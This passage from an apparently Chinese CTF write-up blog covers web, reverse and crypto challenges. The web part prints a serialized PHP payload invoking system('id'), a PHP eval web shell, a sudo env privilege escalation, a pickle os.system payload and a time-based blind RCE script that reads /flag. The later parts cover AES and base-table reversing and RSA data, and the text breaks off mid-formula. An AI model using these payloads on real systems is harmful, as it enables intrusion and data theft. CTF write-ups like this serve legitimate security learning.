Tzo3OiJsaFJhTUs3IjoyOntzOjI6IkRvIjtPOjc6IlN0YXJ2ZW4iOjE6e3M6NDoiZ2lybCI7Tzo1OiJQYXJhciI6Mjp7czoxNjoiAFBhcmFyAGV4ZWN1cmlzZSI7czo0OiJtYW4hIjtzOjc6ImhhbnNvbWUiO086MzoiU1lDIjoxOntzOjc6ImZvcmV2ZXIiO086NzoiU3RhcnZlbiI6MTp7czo2OiJmcmllbmQiO086NzoibGhSYU1LNyI6MTp7czo0OiJsb3ZlIjtzOjEzOiJzeXN0ZW0oImlkIik7Ijt9fX19fXM6MzoiWW91IjtPOjM6IlNZQyI6MTp7czo3OiJmb3JldmVyIjtyOjU7fQ==</span></span><br></pre></td></tr></table></figure><p>发现存在 disable_function，无法读/flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec,system,shell_exec,popens,popen,curl_exec,curl_multi_exec,proc_open,proc_get_status,,readfile,unlink,dl,memory_get_usage,dl,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,linkopen_basedir </span><br></pre></td></tr></table></figure><p>更换命令为 <code>file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval($_POST[1]);&quot;);</code> 写马，蚁剑连接，使用绕过 disable_function 插件，测试使用PHP7_Backtrace_UAF可以成功执行命令。</p><p><code>sudo -l</code> 发现：<code>NOPASSWD: /usr/bin/env</code></p><blockquote><p>env -C ：在指定目录下执行指定命令，并设置相应的环境变量。例如，输入”env -C /usr/bin ls”命令会在/usr/bin目录下执行ls命令。</p></blockquote><p>提权读/flag：<code>sudo /usr/bin/env -C cat /flag</code></p><p>​</p><h3 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h3><blockquote><p>五个月前，道心破碎，于是便出了这道题，你能治愈当时的我破碎的心灵吗？我会给你flag作为奖励……</p></blockquote><p>注册，登录，提示：<code>Error!!!! give you hint: maybe you can view /starven_s3cret</code>。</p><p>访问 <code>/starven_s3cret</code> 下载源码，代码审计，在 <code>/login</code> 路由下，statement传入内容，再触发pickle反序列化。</p><p>构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;sleep 3&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload))</span><br></pre></td></tr></table></figure><p>发现可以过黑名单，且成功触发sleep。</p><p>尝试反弹shell不成功，配合RCE盲注拿flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">chars = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://xxxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line">s.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/register&#x27;</span>,data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;y&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        payload = <span class="string">f&quot;if [ `cut -c <span class="subst">&#123;i&#125;</span> /flag` = \&#x27;<span class="subst">&#123;char&#125;</span>\&#x27; ];then sleep 1;fi&quot;</span></span><br><span class="line">        payload_b64 = base64.b64encode(<span class="string">f&#x27;&#x27;&#x27;(cos\nsystem\nS&#x27;<span class="subst">&#123;payload&#125;</span>&#x27;\no.&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;statement&#x27;</span>:payload_b64</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = s.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/login&#x27;</span>,data=data,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result += char</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> (char == <span class="string">&#x27;~&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>​</p><h2 id="Reverse-3"><a href="#Reverse-3" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h3><blockquote><p>牢弟很喜欢把秘密藏在乱糟糟的地方不让大家看，你能帮我找找他的秘密吗？</p></blockquote><p><code>main()</code> 函数除花，去掉 <code>db 0E8h</code>，分析逻辑为 AES-CBC加密。</p><p>去反调试 <code>IsDebuggerPresent()</code>，动调得key和iv和密文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = addddb082dd94dcabad5d75639eac9da</span><br><span class="line">iv = 633bbdfb3a2cc6ff5c0862a2cda2eab4</span><br><span class="line">c = dde04c75973314b817b61911618a60234616e21a65c35b2668f5ad30b1ee4bc6abb59ebb73954ac278efcba9be71e1a0</span><br></pre></td></tr></table></figure><p>AES-CBC解密得到flag：<code>SYC&#123;W0w_Y0U_fOUNdDD_TLS_AND_AeS&#125;</code>。</p><p>​</p><h3 id="贝斯！贝斯！"><a href="#贝斯！贝斯！" class="headerlink" title="贝斯！贝斯！"></a>贝斯！贝斯！</h3><blockquote><p>华强摸了摸你的ida并问到:“你这base保熟吗。”</p></blockquote><p>动调看逻辑：</p><p>第一步变表base58，表：<code>Zix7BucHvEV2UAf5e8hKsNDkQ1pq9gjC6RbFwMyLToSnJYWXdaG3r4Pztm</code>；</p><p>第二步，先结合 <code>sub_4018FF()+sub_4019EE()</code>，RC4，key：<code>happy_happy</code>；</p><p>第三步变表base85，根据RC4打乱码表，表：<code>eM+wr=x8aYZ/[zU$yRB&amp;kbO;%p0P5f*7d(n]1Eug4ojc62AC,v39!h-^qQ.G?s)i:DFlS&lt;&gt;#@HINJTmtKLVWX</code>。</p><p>已知密文：<code>RjB6Myu#,&gt;Bgoq&amp;u.H(nBgdIaOKJbgEYj1GR4S.w：</code></p><p>第一步，base85还原得到：<code>6pmB34FC9sbYxcKP9rjGGiyRsx1s6c72</code>；</p><p>第二步，由于时间戳问题，进入 <code>sub_401550()</code>，提取当前日期的年份、月份和日期，并使用它们来创建随机数生成器的种子。</p><p>生成不同的码表来爆破，写入 <code>table.txt</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> Str[<span class="number">68</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(Str, <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span>);</span><br><span class="line">    <span class="type">int</span> str_len = <span class="built_in">strlen</span>(Str);</span><br><span class="line">    <span class="comment">//2024-11-10 00:00:00 = 1731168000</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1735660800</span>;k&gt;=<span class="number">1704038400</span>;k-=<span class="number">86400</span>) &#123;</span><br><span class="line">        <span class="type">int</span> tmp[<span class="number">60</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">char</span> table[<span class="number">68</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line">        srand(k);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">57</span>; ++i ) &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">              j = rand() % str_len;</span><br><span class="line">            <span class="keyword">while</span> ( tmp[j] );</span><br><span class="line">            table[i] = Str[j];</span><br><span class="line">            tmp[j] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        table[<span class="number">58</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %s\n&quot;</span>,k,table);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再解码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;table.txt&#x27;</span>).readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    now = line.strip().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    time = <span class="built_in">int</span>(now[<span class="number">0</span>])</span><br><span class="line">    table = now[<span class="number">1</span>]</span><br><span class="line">    m = base58.b58decode(<span class="string">b&#x27;6pmB34FC9sbYxcKP9rjGGiyRsx1s6c72&#x27;</span>, alphabet=table.encode())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;SYC&#123;&#x27;</span> <span class="keyword">in</span> m <span class="keyword">or</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(time,table,m)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 1725811200 n6KPVUdeqBjQvDG51Nof9uJHW7gRAtLrCcTkXhz2ips3Sb8yFmYa4xZMEw b&#x27;SYC&#123;th1s_ls_an_ez_base&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h2 id="Reverse-Crypto-1"><a href="#Reverse-Crypto-1" class="headerlink" title="Reverse/Crypto"></a>Reverse/Crypto</h2><h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><blockquote><p>离散对数DLP，RSA Modular binomial, base64变表（可与队友联合解题，也可学习些二进制基础，对以后有益），提交的flag格式：flag{xx}</p></blockquote><p>已知输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">c_output=<span class="string">&#x27;d0BURFg2dLNFBLDySWN5RmrUS0k2ejDzdJRLSJkLR0gGBqIVSmR3RLR5RmI1BqRLdqlWemk4Bqr4B0rLdqD0S01HemS0Bqx6d01LS0t2djt5dWO1BLV1Bqr3dL1LSjR6RWk4eq15BFh0R0x6R0OzdWBHSmg3dWg5dmr2RFB6BLDyd0DVRjrHdmg3ejdyeqkHR0gGB0tFRLg4BFBGemNFSJr6BFN3d0IzB0C4B013RjyySJhzRjuydqxFd0D1BjuyemlVS0B6BWk2BLDzejBURml0RLh0RjD0BJR2SWd0BqCLdjN2RFh0RjRHR0uzSj1Ldj1FBWR2R0hySqy0RmS1dg==&#x27;</span></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">n1_output=<span class="string">&#x27;BjI1S0t5djR4dj14dWBURFS0ejCFSWIWdJg4BWrLeqDzejgHemSVeq14ejk6RFSzRLtGBjdyS0xGBqB5R0R5RjhyBFr4SjO0dqSzRjxUSmR2d0OyBFrGdFhVS0u1dmhVBJr4Rjr4R0d1BjB4BFIWRLCFSmgGRWBUS0CGSjC5Sj1HeqdzBqS0SjrGRLNUBJSVdjk4eqg2RFRUBqNHS0k4d0g6Sjg5ejD0RFN5BFd1S0DzR0C2ejdVdqBGRLk2Smk5dLR2BLN4BWd0BmNLdjt2BjN4eq13dFlzdWB5eqgLB01UR0g2eqDVdWgLBWrLBjI1SjSWSqSWdJNUSqVVeJSyRx==&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">c1_output=<span class="string">&#x27;dmrGd0yVeJkLSjhVSWk3BmR3d0S1dLu1SqVyBjB5BWR3BL1HRWBUSjIWRjhVeqNHRWkFRjdzdWIyd0r4emhVBqO0dJlVRLk6dJk6BFOWBqxLdWNGR0N3S0kLdJr2B01GdqhVejx4RWh0BFI0SqtGRjx5BLd0djgLSmr5RFR2S0gFd0lWRWg2dWO0B0I1BLyVSJgFBJrFeqt4BquVBqtUejx4RFI0ejuVBjCUejR5BJIVRFlVSjdzSWR5BLgHBLBUdWr2RFSzBqR5SJRGSqlzRFkURLuWRWrFRmk5dJSzSmI1dmR3dWIyej14S0NLSmkURFOVeJrHSWB4d0S1dmSy&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">hint1_output=<span class="string">&#x27;RLdWSqx2RWlVR0NLd0d1dqr2eqgHSWhydjxUeq1Gd0R6dmO0RWNUd0BGejx6S0xLeqkLRjS0ejSVd0h0eJl0ejgFdqk2BqVzdLCLdWkLR0rHdFl0S01LBJk6ejhWRLg2eJB2RmBFRWSyej12djCGeqB4BJN5d0rURWBUeJg5BLNGdjtGBJR3d0NHdLh0dFS1BLxURWrUSmR2SjC3BqrUd0BLdjRFSjR3RWrUdmk3RjB4SjNURjg3R0tUdLt2RLSyRml1eqVyRjgLBjC3djCHSjxFeq12BmBHBjxFBjr6BJR3BJSVBjx6SjBLR0x4dLC5SjrGBjg6BqkGdjVWBLx4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">n2_output=<span class="string">&#x27;BFd0BqCFSjD1Smr4dFRHBLg2Bjx5BqVyRLy0Bmr2dqt6djy0dFhyBqr6B0B5BquWSqN3djB4BLR5BFdVemSWRLdWRmrGdqx6BFr6eJlyBmk6BjIyBLh0BLgUS0N4R0gURWN4Bqg2dLtGdFk2SquWdjrLejN5emkFBWSzej1LdjR6S0uVdLC3SjCUBjV0RFO0dqr2ejkFSjyydWd0BFk4Bjx5BWdydWlzBjC3djx4d0DWSjDWdFB4dWhyd0dVdmgFBjRUSmr3dL14SjxFS0dVBWkHBqh1BL1USqr2B013B0V1BLCLBjtLeJR5BLhVd0rURjD1Smd0Sjr6RWhVdJd1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">c2_output=<span class="string">&#x27;BWhVdmg3Bj15RWR6dLVzRjdVRjBLeJO1dqBUBJr5eJg4B0BLSJrUSjC3BJNLRmr6d0g2Rj12B0uVSWRGequzdJgGdJIyBFBGSJBLdqyWB0r2B0gGej1GRmkLBWSzeqR2B0xUBLlVd0r6BLhWemlWd0dVemN3d0O0dqDzdWN4dFBUBjBLRFI1dqRGBWBURmrGS0k5dmgLS0u1BqRGR0R5equ1BLDVdqB2dWB2RmSVRFlySjCLBmBLBjrFRFdWejuyRFI1SJN6RmR2BWg2djV0d0I0SjD1S0uzdjS0SjIVBJOyBjl0S0NHRml1djg5djR5dmIyejBUeJSzdq12Sjlz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">hint2_output=<span class="string">&#x27;BWh1BLDzBqxFS0I0eJSydLxFBJl1dmd1SjIVBqOyBqR6SjxGB0OySj1HB0B3dLVWdLR2Sql1RjxFSmB6djDzBWhWSmkFejB2dqRLRjCFR0rLBFgGejI0BFdWRWk3S0xHRjgLRWSySjuWB0l0SWNLSmSzd0I0BjDyRjt5BJIydLSVB0N6ejN2Bj1HdWSzBjSWBmIVBLhyeqRGRFNGRWrFdqI1djRLdFNGBJrUB0C6dLgGemkURLrHSqrLdLN4djVydJk4dJrGB01HRLlzB0tUSWrFSqx2RmO0BmN2d0SzB0VzRWrHRjIyBWlyemkHRmg3d0y0BjhyS0rGRLhWdjDV&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">hint3_output=<span class="string">&#x27;BLkGdjr2BqO1Sjd0R0DWd0gHBjg3BmrGR0BFd0lzBFh1Sqr3RLVWBJI1BqtLejy0dJlVBLl0BqIWS016dWh1B0k2dmh0dqI1dj15SWdydjyzdqx3Sjd0Sqr5dJgGRLDyd0t5ejSWejlWRFlzRL1LejIWBjD0eqV1Smg6R0IVS0dVdjC5dJIzeJSVdmlyBLdVBWIWR0I0SqVyS0u1eqhWRFr5dFk3dWkGdjVzBjBFdjtHRLNUS0RGemrFdJR4SjN4d0C2ejOVSmk6d0yyS0NLBqhWdFBFeqVVRFkFBJrUdqIzRjx5BqD1SqD1BWIWBmr2djgUemIWSqr4RFRUSmIy&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">a_output=<span class="string">&#x27;RLC6eJIWBLOVdj14ejyWBjx6BqkUSjCUSqg2d0d0BLhydLIzdmhzejy1BJg3BLxLBqk5BqO0SjRHRFhydLOWd0xUdLR4dWS1eJgUBLdzdjrFBLdVd0d0d0dzSjkURFBLdqk2Sjy1Bqh1B0xGSmhyBLkLdmR6BmrHRL12ejSWemk3R0R6Smh0eqIVR01GBmg3dmNUSmd0B0DzdJgFd0t5dLCUSjtLRmR5BjD1BmOVS012BjdVejtHd0CLBWg6d0yWSqu1B0gLSqC5RFdzSJOVR0CGdjuVdmr3RmSWRWBUdLSVeqdWeqlzSJkFeqkFBjy1dj16SWk6BFgGdjgUBjVyBx==&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br></pre></td></tr></table></figure><p>分析程序，base64变表为 <code>CDEqrIJKNOPABdefghijklmQRSTstuvwxyz01VWXYZabcnop456L23FGHUM789+/</code>。</p><p>分别解码得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">c_output=<span class="string">&#x27;639cd472630afb1aa9f5490b4f3de3b4701eef5c61aad06345f9e001021340cf989fc082693f745716bd39d015793e62be08913dcb82b2b6c8ed56d15a4cc230a60ea185d593a858b47276c403c79b6da23b561b200295a8addba7a48660d17a9eef322e430b939aecc4ca0c0f4fcc003524cdca68b7be935962f4b4ad8cafd5&#x27;</span></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">n1_output=<span class="string">&#x27;11df715605906c9cfc906faf4d02a380b9489fe890952cfbc7713af87031b61a4a3a0e2c46ba89ef462a3a77def7d5de0a0a10b3d1303afc06ed7bc9f07e01e9883b06ce17c290fe550844cf9028f50642e4190ccb13cdf0bb0493e437c54ee17643202cc1b35741208957eb6c1843299b4480e6d32a311de6fd6f4b9d9e8fab&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">c1_output=<span class="string">&#x27;5a768e8e3e4efe51f566d77dd9a1312f5398bc9e1fa4e828be6a3b6aa6109de02c4eec524e23bf0836b7b25f534a429744e980bdc3acd77a8133c543ea1cf4f4665fbd46bc21d38edd60a687007e079980cac97e1099610aeceee3bff13483396a4cfb061df7d5bce9c7fba6ae14fbead5f56aa990f23ee9cbe8a8fc066d5fa&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">hint1_output=<span class="string">&#x27;c3fd84beeb2363d414848fda5898976625bcbb9637982f83853a6c96e64c8ec94645409b7036e3b187ecf930e294fc448c4ac6bfa9945078300b1619bc98d13275770f562874c7fd389ba9ef4e05019633566e65ba95e5a30e29a45b79774c6aaed89aa43105508e868941c81861120f50fe182e33b80701e1714205759f380&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">n2_output=<span class="string">&#x27;3cc006e0dea07f834418109ac8c1a447258c7da01223107fd255303613ce9ffc3faa74823a28ea1e211a34c349f20b49bb00447777e4d7f5139219e62fb993562f7e705e0919ccbc414956e8a6cc3e01812ca6eb10558060fe0f7c06da63e5d6169ea5790e86f3e2e804d399d1429529d3031738f134e619a0decce12bde4cd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">c2_output=<span class="string">&#x27;2de5d5191bf279ba3ea338bd4390a18d0233da9e050b3aa2644a9427eff787b4d74aa3c7dc348f214247997ae32fb86428935e61234f9ef63e9b562c40b6b07c9133cad4672c9aa7f515d3f7d067b6187d30e4346c4afeceae031c3116ccf97acaddb2af42d459c61ce0df7b56ce1e0ba15cf28aed5415615aa9398fb494e5b&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">hint2_output=<span class="string">&#x27;2dd30b086f1c8fa7860ed5cde1e02a062e8722ae9823579f764d5da86ec250b2dfee6934463a06b133d791c3cfbe5f88a43bfae7f25cfb3efb61c10aa710aa76e2229241986fb16f1ae34a867cb7ba641d5637b70a92027479e9c18d1372059a4e04a7298c5b279fa6d84abc1b466b29bba8a1a2ea9e8ad568c14af17c4f50e&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">hint3_output=<span class="string">&#x27;35751402de3cb0f6481451a7b3665b3ddd15c9f0ad07398c4ee35c01ff926dd2545dc41d591fca58b485e3cd114d7c0a67196f95fcebc9391f10c89ded2b1ef3e5014ab8fe5ea33e2afb1cd9af7d84fca17e56e759b136578c29f679a64f0e2060492eee268af2304f7c689ece60a941ba8100dd0d2af1a45499afd10cf9eaa&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br><span class="line">a_output=<span class="string">&#x27;c028af32e59098f182059e09d4463c34a71b5db98d0d538305102ce68cda72f6897606fd8d933b51633e63c63be59cc3454e8d04d287eda3535f21a8c9496f9e5b62edc81eb971d55b9ecc20b4d6671709e73af110d1bef9413e9786032d268fd7d243d01ccbdbeb0757e5a5affbc976e83f85bde685618d592fe23d754919a2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================================================</span></span><br></pre></td></tr></table></figure><p>分析计算部分的逻辑为：</p><p>$c_1 = p^{e_1} \pmod {n_1}$</p><p>$h_1 = 2023p_1+2024 \pmod {q_1}$</p><p>$c_2 = q^{e_2} \pmod {n_2}$</p><p>$h_2 = (2023p_2+2024q_2)^{2323} \pmod {n_2}$</p><p>$h_3 = (2024p_2+2023q_2)^{2424} \pmod {n_2}$</p><p>$a = g^e 